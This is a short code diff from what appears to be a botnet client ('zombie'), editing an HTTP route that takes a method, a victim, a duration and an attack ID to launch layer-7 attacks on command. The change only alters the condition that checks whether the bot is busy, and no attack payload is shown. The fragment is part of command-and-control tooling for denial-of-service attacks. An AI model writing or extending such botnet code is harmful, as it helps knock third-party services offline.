@@ -107,7 +107,7 @@ masterReachable.on('true', (s) => {
 
 settingIntegrity.on('true', () => {
     app.get('/layer7/:methodID/:victim/:time/:attackID', (req, res) => {
-        if (!(zombie.busy)) {
+        if (!(zombie.busy === false)) {
             let victim = req.params.victim
             let timelimit = req.params.time
             if (isNaN(timelimit)) {
